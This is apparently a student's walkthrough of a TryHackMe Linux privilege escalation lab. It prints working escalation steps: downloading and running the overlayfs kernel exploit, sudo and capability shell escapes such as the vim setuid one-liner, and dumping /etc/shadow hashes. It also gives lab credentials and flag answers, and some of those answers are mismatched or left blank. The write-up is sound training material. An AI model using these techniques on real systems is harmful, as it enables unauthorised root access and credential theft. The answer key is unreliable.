<h3> Welcome to the <em>TryHackMe ...</em></h3>
<h1>Jr Penetration Tester learning path > Privilege Escalation ></h1>
<h2>Linux Privilege Escalation</h2>
<p>Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques.</p>
<br>
<p>October 31, 2024<br></p>

![image](https://github.com/user-attachments/assets/3e94eff8-ebf8-42f4-952b-9c9baae47b0f)

<p>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s key part of my 32-day-streak in <a href="https://www.wicys.org/benefits/security-training-scholarship/">WiCyS SANS Security Training</a> Stage 2 Program.<br><br>
Let´s get started!!<br><br>
Access this TryHackMe Room clicking <a href="https://tryhackme.com/r/room/linprivesc">Linux Privilege Escalation</a>.<br>

<h2>Task 1 - Introduction</h2>
<br>

<h2>Task 2 - What is Privilege Escalation</h2>
<br>

<h2>Task 3 - Enumeration</h2>
<br>

<pre><code>$ nmap -sS -sV -A -T4  [Target]
|  
Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-31 01:14 GMT
Nmap scan report for ip-[Target].eu-west-1.compute.internal ([Target])
Host is up (0.0013s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 bf:[REDACTED] (DSA)
|   2048 12:[REDACTED]  (RSA)
|   256 f5:[REDACTED]  (ECDSA)
|_  256 dc:[REDACTED] 5 (EdDSA)
MAC Address: [REDACTED]  (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.34 ms ip-[Target].eu-west-1.compute.internal ([Target])

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.57 seconds
</code></pre>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 3.1 - <em>What is the hostname of the target system?</em><br>
>> <code><strong>wade7363</strong></code><br>
<p></p>

<pre><code>$ hostname
wade7363
</code></pre>

<pre><code>$ uname -n
wade7363
</code></pre>

<pre><code>$ bash -i
karen@wade7363:/$ 
</code></pre><br>

> 3.2 - <em>What is the Linux kernel version of the target system?</em><br>
>> <code><strong>3.13.0-24-generic</strong></code><br>
<p></p>

<pre><code>$ uname -r
3.13.0-24-generic
</code></pre><br>

> 3.3 - <em>What Linux is this?</em><br>
>> <code><strong>Ubuntu 14.04 LTS</strong></code><br>
<p></p>

<pre><code>$ lsb_release -d
Ubuntu 14.04 LTS
</code></pre>

<pre><code>$ cat /etc/issue
Ubuntu 14.04 LTS \n \l
</code></pre><br>

> 3.4 - <em>What version of the Python language is installed on the system?</em><br>
>> <code><strong>Ubuntu 14.04 LTS</strong></code><br>
<p></p>

<pre><code>$ python --version
Python 2.7.6
</code></pre><br>

> 3.5 - <em>What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)</em><br>
>> <code><strong>CVE-2015-1328</strong></code><br>
<p><br></p>

![image](https://github.com/user-attachments/assets/124280b5-e2c7-4141-8537-8271f10de629)

<br>

![image](https://github.com/user-attachments/assets/abb10e35-7661-47b6-84d0-21459d8de827)

<h2>Task 4 - Automated Enumeration Tools</h2>
<br>

<p>Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.<br>

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.</p>

<ul style="list-style-type:square">
    <li>LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</li>
    <li>LinEnum: https://github.com/rebootuser/LinEnum</li>
    <li>Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration</li>
    <li>Linux Priv Checker: https://github.com/linted/linuxprivchecker</li>
</ul></p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 4.1 - <em>Install and try a few automated enumeration tools on your local Linux distribution</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p></p>


<h2>Task 5 - Privilege Escalation: Kernel Exploits</h2>
<br>

<p><strong>Note: Launch the target machine attached to this task to follow along.<br>

You can launch the target machine and access it directly from your browser.<br>

Alternatively, you can access it over SSH with the low-privilege user credentials below:<br><br>

Username: karen<br>

Password: Password1</strong></p>

<p>.......................</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 5.1 - <em>find and use the appropriate kernel exploit to gain root privileges on the target system.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

> 5.2 - <em>What is the content of the flag1.txt file?.</em><br>
>> <code><strong>THM-28392872729920</strong></code><br>
<p><br></p>

<p>Using THM AttackBox or personal VM, run ...</p>

<pre><code>$ searchsploit 3.13.0
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local  | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local  | linux/local/37293.txt
Unified Remote 3.13.0 - Remote Code Execution (RCE)                              | windows/remote/51309.py
--------------------------------------------------------------------------------- ---------------------------------
</code></pre>

<pre><code>$ searchsploit -m 37292.c
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /opt/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines
Copied to: /root/37292.c
</code></pre><br>

<pre><code>$ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...    
</code></pre><br>

<p>Now using the Target Machine in /tmp...</p>

<pre><code>$ wget http://10.10.205.28:8000/37292.c
--2024-10-30 21:49:03--  http://10.10.205.28:8000/37292.c
Connecting to 10.10.205.28:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/plain]
37292.c: Permission denied

Cannot write to ‘37292.c’ (Permission denied).
$ cd /tmp
$ wget http://[Source_IP]:[Source_Port]/37292.c
--2024-10-30 21:49:33--  http://[Source_IP]:[Source_Port]/37292.c
Connecting to [Source_IP]:[Source_Port]... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/plain]
Saving to: ‘37292.c’

100%[===================================================================================================================>] 4,968       --.-K/s   in 0s      

2024-10-30 21:49:33 (1022 MB/s) - ‘37292.c’ saved [4968/4968]
</code></pre><br>

<pre><code>$ gcc -static 37292.c -o exploit
$ ./exploit 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
</code></pre><br>

<pre><code># whoami
root
</code></pre><br>

<pre><code># cat /home/matt/flag1.txt
THM-28392872729920
</code></pre><br>

<h2>Task 6 - Privilege Escalation: Sudo</h2>
<br>

<p><strong>Note: Launch the target machine attached to this task to follow along.<br>

You can launch the target machine and access it directly from your browser.<br>

Alternatively, you can access it over SSH with the low-privilege user credentials below:<br><br>

Username: karen<br>

Password: Password1</strong></p>

<p>.......................</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 6.1 - <em>How many programs can the user "karen" run on the target system with sudo rights?</em><br>
>> <code><strong>3</strong></code><br>
<p><br></p>

<pre><code># sudo -l
Matching Defaults entries for karen on ip-[Target]:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-[Target]:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
</code></pre><br>

> 6.2 - <em>What is the content of the flag2.txt file?</em><br>
>> <code><strong>THM-402028394</strong></code><br>
<p></p>

<pre><code>$ sudo -lsudo find . -exec /bin/sh \; -quit
# whoami
root
</code></pre><br>

<pre><code>$ find / -name flag2.txt 2>/dev/null
/home/ubuntu/flag2.txt
# cat /home/ubuntu/flag2.txt
THM-402028394
</code></pre><br>

> 6.3 - <em>How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?</em><br>
>> <code><strong>sudo nmap --interactive</strong></code><br>
<p></p>

<p>Another option would be ...</p>

<pre><code>$ nmap> !sh
</code></pre><br>

> 6.4 - <em>What is the hash of frank's password??</em><br>
>> <code><strong>$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1</strong></code><br>
<p></p>

<pre><code># sudo less /etc/shadow
...
list:*:18561:0:99999:7:::
...
...
karen:$6$QHTxjZ77ZcxU54ov$DCV2wd1mG5wJoTB.cXJoXtLVDZe1Ec1jbQFv3ICAYbnMqdhJzIEi3H4qyyKO7T75h4hHQWuWWzBH7brjZiSaX0:18796:0:99999:7:::
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::
/etc/shadow (END)
</code></pre><br>

<h2>Task 7 - Privilege Escalation: SUID</h2>
<br>

<p><strong>Note: Launch the target machine attached to this task to follow along.<br>

You can launch the target machine and access it directly from your browser.<br>

Alternatively, you can access it over SSH with the low-privilege user credentials below:<br><br>

Username: karen<br>

Password: Password1</strong></p>

<p>Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.<br>

You will notice these files have an “s” bit set showing their special permission level.</p>

<p><code>find / -type f -perm -04000 -ls 2>/dev/null</code>code> will list files that have SUID or SGID bits set.</p>

<p>.......................</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 7.1 - <em>Which user shares the name of a great comic book writer?</em><br>
>> <code><strong>gerryconway</strong></code><br>
<p></p>

<pre><code>$ bash -i
karen@ip-10-10-55-136:/$ cat /etc/passwd
...
gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
user2:x:1002:1002::/home/user2:/bin/sh
...
karen:x:1003:1003::/home/karen:/bin/sh
</code></pre><br>

> 7.2 - <em>What is the password of user2?</em><br>
>> <code><strong>_________________________</strong></code><br>
<p><br></p>

![image](https://github.com/user-attachments/assets/fe29a036-0e32-4393-ada4-c26d4415e3cf)

<pre><code>karen@ip[Target]:/$ /usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
</code></pre><br>


<pre><code> 
root:*:18561:0:99999:7:::
...
nobody:*:18561:0:99999:7:::
...
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
...
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
</code></pre><br>

> 7.3 - <em>What is the content of the flag3.txt file?</em><br>
>> <code><strong>______________________</strong></code><br>
<p><br></p>

<pre><code># 
</code></pre><br>

<h2>Task 8 - Privilege Escalation: Capabilities</h2>
<br>

<p><strong>Note: Launch the target machine attached to this task to follow along.<br>

You can launch the target machine and access it directly from your browser.<br>

Alternatively, you can access it over SSH with the low-privilege user credentials below:<br><br>

Username: karen<br>

Password: Password1</strong></p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 8.1 - <em>Complete the task described above on the target system.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p></p><br>

> 8.2 - <em>How many binaries have set capabilities?</em><br>
>> <code><strong>6</strong></code><br>
<p></p>

<pre><code>karen@ip[Target]:/$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
</code></pre><br>

<pre><code># whoami
root
#bash -i
root@ip-[Target]:~# find / -name flag4.txt 2>/dev/null
/home/ubuntu/flag4.txt
root@ip-[Target]:~# cat /home/ubuntu/flag4.txt
THM-9349843
</code></pre><br>

<pre><code>./vim -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
</code></pre><br>


> 8.3 - <em>What other binary can be used through its capabilities?</em><br>
>> <code><strong>view</strong></code><br>
<p></p><br>

> 8.4 - <em>What is the content of the flag4.txt file?</em><br>
>> <code><strong>_______________</strong></code><br>
<p></p><br>

<h2>Task 9 - Privilege Escalation: Cron Jobs</h2>
<br>

<h2>Task 10 - Privilege Escalation: PATH</h2>
<br>

<h2>Task 10 - Privilege Escalation: NFS</h2>
<br>

<h2>Task 11 - Capstone Challenge</h2>
<br>







